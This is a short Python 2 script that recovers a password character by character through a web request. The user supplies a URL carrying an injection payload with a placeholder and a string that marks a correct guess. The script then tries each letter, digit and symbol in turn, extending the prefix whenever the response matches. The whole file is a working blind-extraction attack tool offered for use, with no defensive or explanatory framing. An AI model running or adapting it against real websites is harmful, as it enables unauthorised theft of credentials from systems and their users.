#!/usr/bin/env python

import urllib2
from optparse import OptionParser

chars_lows = [ 'a', 'z', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'q', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'w', 'x', 'c', 'v', 'b', 'n' ]
chars_ups = [ 'A', 'Z', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 'Q', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'W', 'X', 'C', 'V', 'B', 'N' ]
chars_digits = [ '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' ]
chars_specials = [ ',', '?', ';', '.', ':', '/', '!', '%', '*',  '$', '"', '\'', '(', '-', '_', ')', '=', '}', ']', '@', '^', '\\', '`', '|', '[', '{', '~' ]

chars = chars_lows + chars_ups + chars_digits + chars_specials

# Checks a single password and tell if it's correct or not
def test(url, string, password):
	query = url.format(password)
	response = urllib2.urlopen(query)
	content = response.read()
	return string in content

# Loop bruteforcing each character of password
def find(url, string, seed):
	for char in chars:
		newseed = seed + char
		if test(url, string, newseed):
			print "* {}".format(newseed)
			find(url, string, newseed)
			return
	print "* ---"
	print "* Password found : {}".format(seed)

# Options parser
parser = OptionParser()
parser.add_option("-u", dest="url", help="URL with payload. Replace password with {}")
parser.add_option("-s", dest="string", help="String to look for in response to check whether tested password fragment is correct")
parser.add_option("--seed", dest="seed", help="Starting password fragment. Will start with an empty password if this option isn't provided", default="")
(options, args) = parser.parse_args()

if not options.url:
	parser.error("No URL provided")
if not options.string:
	parser.error("No string provided")

# Go
find(options.url, options.string, options.seed)
